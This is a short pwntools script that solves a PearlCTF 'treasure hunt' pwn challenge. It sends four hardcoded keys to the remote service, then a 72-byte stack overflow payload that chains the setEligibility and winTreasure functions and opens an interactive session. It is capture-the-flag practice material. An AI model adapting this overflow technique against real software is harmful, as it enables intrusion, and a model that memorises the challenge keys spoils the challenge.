from pwn import *

elf = ELF('./vuln')
# io = process(elf.path)
io = remote('treasure-hunt.ctf.pearlctf.in', 30008)

message = ['whisp3ring_w00ds', 'sc0rching_dunes', 'eldorian_ech0', 'shadow_4byss']
offset = 72
ret_addr = 0x40101a

for i in range(4):
    io.sendlineafter(b'Enter the mystery key to proceed: ', message[i])

payload = b'A' * offset
payload += p64(elf.symbols['setEligibility'])
payload += p64(ret_addr)
payload += p64(elf.symbols['winTreasure'])

io.sendlineafter(b'You are worthy of the final treasure, enter the final key for the win:- ', payload)

io.interactive()

